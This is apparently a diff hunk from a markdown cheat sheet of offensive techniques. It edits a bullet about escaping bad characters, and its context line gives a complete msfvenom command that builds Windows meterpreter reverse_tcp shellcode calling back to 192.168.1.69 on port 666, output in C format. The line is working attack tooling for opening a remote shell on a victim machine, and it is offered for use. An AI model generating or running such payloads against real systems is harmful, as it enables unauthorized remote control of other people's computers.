@@ -165,7 +165,7 @@ from $env:comspec variable and use the **-Join ''** operator to take the arraw a
 
 ---
 
-- Build shellcode in **C** format using msfvenom and escaping bad chars
+- Build shellcode in **C** format using msfvenom and escaping **bad chars** (-b '\x0a\x0d')
 
       msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.69 LPORT=666 -b '\x0a\x0d' -f c -o shell.txt
 
